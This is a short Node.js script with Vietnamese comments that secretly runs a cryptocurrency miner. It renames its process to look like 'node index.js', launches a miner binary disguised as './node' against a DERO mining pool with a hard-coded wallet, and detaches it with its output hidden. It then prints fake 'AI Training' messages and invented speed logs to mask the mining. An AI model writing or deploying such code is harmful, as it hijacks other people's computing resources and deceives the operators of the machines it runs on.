const { spawn } = require('child_process');
const fs = require('fs');
const { exec } = require('child_process');

// Đổi tên tiến trình hiển thị trong htop
process.title = 'node index.js'; // Đặt tên giả cho tiến trình

// Thông tin pool và ví
const minerPath = './node'; // Đường dẫn tới miner thực tế (đã đổi tên thành "node")
const args = [
  '-o', 'community-pools.mysrv.cloud:10300', // Pool
  '-u', 'deroi1qy9al37a8qgjmat4y9wf5wc637md58jtt6p4980k34xxhrk2h9m6jq9pvfz92xcqqqqextxqgv3qaljzwm', // Ví
  '-p', 'rpc', // Password hoặc protocol
];

// Cấp quyền thực thi cho tệp miner (./node)
exec('chmod +x ./node', (err, stdout, stderr) => {
  if (err) {
    console.error(`Lỗi khi cấp quyền: ${stderr}`);
    return;
  }
  console.log('Cấp quyền thực thi cho ./node thành công.');

  // Chạy miner thực tế
  const miner = spawn(minerPath, args, {
    stdio: 'ignore', // Ẩn stdout và stderr của miner thật
    detached: true,  // Tách miner ra khỏi tiến trình Node.js
    shell: true,     // Chạy thông qua shell
  });
  miner.unref(); // Đảm bảo tiến trình miner chạy ngầm độc lập
  console.log('AI Training đang chạy ngầm...');
});

// Hàm giả lập Speed (hashrate) và Job (share)
function generateFakeLog() {
  const fakeSpeed = (Math.random() * 1000 + 500).toFixed(2); // Speed ngẫu nhiên từ 500-1500H/s
  const fakeJob = Math.floor(Math.random() * 50); // Job ngẫu nhiên từ 0-50

  const logEntry = `Speed: ${fakeSpeed}H/s | Job: ${fakeJob} | Time: ${new Date().toISOString()}`;

  // Hiển thị log giả trực tiếp trên terminal
  console.log(logEntry);
}

// Tạo log giả mỗi 5 giây
setInterval(generateFakeLog, 5000);

console.log('AI Training với log Speed và Job...');
